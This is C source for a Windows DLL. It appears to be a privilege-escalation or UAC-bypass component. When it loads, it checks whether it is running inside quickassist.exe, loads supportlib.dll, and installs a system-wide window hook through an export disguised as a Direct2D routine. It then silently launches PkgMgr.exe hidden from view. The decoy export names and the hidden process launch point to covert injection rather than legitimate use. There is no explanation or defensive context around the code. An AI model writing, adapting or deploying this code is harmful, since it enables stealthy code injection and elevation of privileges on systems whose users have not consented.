#include "Windows.h"
#include <string>
#include "psapi.h"
extern "C" __declspec(dllexport) int InitializeD2Routine() {
    return 1;
}

BOOL CheckProcessName(){
    char pName[1024];
        GetProcessImageFileNameA((HANDLE)-1, pName, 1024);
        char * p;
        p = strtok(pName, "\\"); 
        while (p != NULL) {
            
            if(!strcmp(p, "quickassist.exe"))
                return TRUE;
                
            
                p = strtok(NULL, "\\");
            
        }
    return FALSE;
}


int applyHook(){

    if(!CheckProcessName())
        exit(0);
    HMODULE library = LoadLibraryA("supportlib.dll");
	HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "InitializeD2D1Engine");
    STARTUPINFOW siW;
    SHELLEXECUTEINFOA shExInfo;
	HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, hookProc, library, 0);
    
    if(hook){
       
        ZeroMemory(&siW, sizeof(STARTUPINFOW));
        ZeroMemory(&shExInfo, sizeof(SHELLEXECUTEINFOA));
        shExInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
        shExInfo.lpFile = "C:\\Windows\\System32\\PkgMgr.exe";
        shExInfo.fMask = 0x40;
        shExInfo.nShow = SW_HIDE;
        ShellExecuteEx(&shExInfo);
    } 
	Sleep(1000);
	UnhookWindowsHookEx(hook);

    exit(0);
 
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
	case DLL_PROCESS_ATTACH:
        CreateThread(0,0, (LPTHREAD_START_ROUTINE)applyHook, 0, 0,0);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
